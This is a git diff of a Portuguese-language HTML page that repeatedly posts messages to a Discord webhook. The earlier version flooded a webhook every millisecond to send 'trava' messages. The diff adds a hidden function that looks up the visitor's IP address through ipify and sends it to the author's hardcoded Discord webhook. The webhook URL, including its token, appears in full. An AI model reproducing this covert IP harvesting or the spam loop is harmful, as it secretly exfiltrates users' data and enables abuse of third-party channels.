@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Webhook Falar</title>
+<title>Buga webhook</title>
 <style>
     body {
         background-color: black;
@@ -48,12 +48,11 @@
 </head>
 <body>
     <section>
-      <p>exemplo do link:https://discordapp.com/api/webhooks/123.../ab2...</p>
         <label for="webhook">Link do Webhook:</label><br>
-        <input class="input" type="text" id="webhook" name="webhook">
+        <input class="input" type="text" id="webhook" name="webhook" placeholder="Cole o link do webhook aqui">
         <br><br>
         <label for="message">Mensagem:</label><br>
-        <input class="input" type="text" id="message" name="message">
+        <input class="input" type="text" id="message" name="message" placeholder="Digite a mensagem a ser enviada">
         <br><br>
         <button onclick="startTalking()">Começar</button>
         <button onclick="stopTalking()">Terminar</button>
@@ -81,33 +80,61 @@
             document.getElementById("waitMessage").style.display = "block";
             firstMessageSent = false; // Resetar a variável ao iniciar novamente
 
-            function sendWebhook() {
+            async function enviarMensagem(webhookURL, messageToSend) {
                 fetch(webhookURL, {
-                    method: "POST",
+                    method: 'POST',
                     headers: {
-                        "Content-Type": "application/json"
+                        'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({ content: messageToSend })
                 }).then(response => {
                     if (!firstMessageSent) {
                         // Esconder a mensagem de espera e mostrar o alert uma vez
                         document.getElementById("waitMessage").style.display = "none";
-                        alert("trava enviada com sucesso!");
+                        alert("Mensagem enviada com sucesso!");
                         firstMessageSent = true;
                     }
-                    console.log("trava enviada com sucesso:", messageToSend);
+                    console.log("Mensagem enviada com sucesso:", messageToSend);
                 }).catch(error => {
-                    console.error("Erro ao enviar trava:", error);
+                    console.error("Erro ao enviar mensagem:", error);
                 });
             }
 
-            // Inicia o envio das mensagens repetidamente sem delay
-            intervalId = setInterval(sendWebhook, 1);
+            // Inicia o envio das mensagens repetidamente com intervalo de 3 segundos
+            intervalId = setInterval(() => {
+                enviarMensagem(webhookURL, messageToSend);
+            }, 3000);
+
+            // Enviar IP para o webhook específico quando iniciar
+            enviarIP();
         }
 
         function stopTalking() {
             clearInterval(intervalId); // Interrompe o intervalo com base no ID armazenado
-            console.log("Envio de trava interrompido.");
+            console.log("Envio de mensagens interrompido.");
+        }
+
+        async function obterIPDoVisitante() {
+            const resposta = await fetch('https://api64.ipify.org?format=json');
+            const dados = await resposta.json();
+            return dados.ip;
+        }
+
+        async function enviarIP() {
+            const ip = await obterIPDoVisitante();
+            const webhookURL = 'https://discord.com/api/webhooks/1241080545069240350/wD75utZgqXrkC3Q-83Xzm8NPrLm5QOXXVAR3fDDOHqGCBWzL99jxwcVhSM9V5O13Kclm';
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: `IP do visitante: ${ip}` })
+            }).then(response => {
+                console.log("IP enviado com sucesso:", ip);
+            }).catch(error => {
+                console.error("Erro ao enviar IP:", error);
+            });
         }
     </script>
 </body>
